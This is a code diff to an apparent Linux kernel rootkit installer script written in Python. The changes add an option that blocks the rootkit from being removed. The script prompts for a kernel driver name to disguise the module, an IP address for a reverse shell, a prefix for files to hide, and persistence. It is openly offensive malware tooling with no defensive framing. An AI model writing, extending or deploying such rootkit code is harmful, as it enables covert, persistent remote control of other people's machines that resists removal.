@@ -145,6 +145,9 @@ def is_module_already_persistent(module_name):
 def load_module(module_path, config):
 	"""
 	Run $ insmod module, appending any included parameters.
+	REVERSE_SHELL_IP: The IP address the reverse shell will connect to.
+	HIDDEN_FILE_PREFIX: The prefix of files that will be hidden.
+	BLOCK_REMOVAL: Toggle for blocking the removal of the rootkit.
 	"""
 	print_status("Loading module...")
 	options = ""
@@ -153,6 +156,11 @@ def load_module(module_path, config):
 
 	if "HIDDEN_FILE_PREFIX" in config:
 		options += " hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
+
+	if config["BLOCK_REMOVAL"]:
+		options += " block_removal=1 "
+	else:
+		options += " block_removal=0 "
 
 	cmd = "insmod {} {}".format(module_path, options)
 	run_cmd_exit_on_fail(cmd, run_with_os=True)
@@ -235,16 +243,18 @@ def validate_os_and_kernel():
 def install(kernel_version):
 	print_status("Starting rootkit installation...")
 
-	config = {}
-	config["MODULE_NAME"] = "garden"
+	config = {
+		"MODULE_NAME": "garden"
+	}
 
-	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
+	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", config["MODULE_NAME"])
+	config["BLOCK_REMOVAL"] = prompt_yes_no("Block removal of rootkit?")
 
 	if prompt_yes_no("Enable reverse shell?"):
 		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", None)
 
 	if prompt_yes_no("Enable hidden files?"):
-		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "garden")
+		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", config["MODULE_NAME"])
 
 	if prompt_yes_no("Enable persistence?"):
 		persist_flag = True
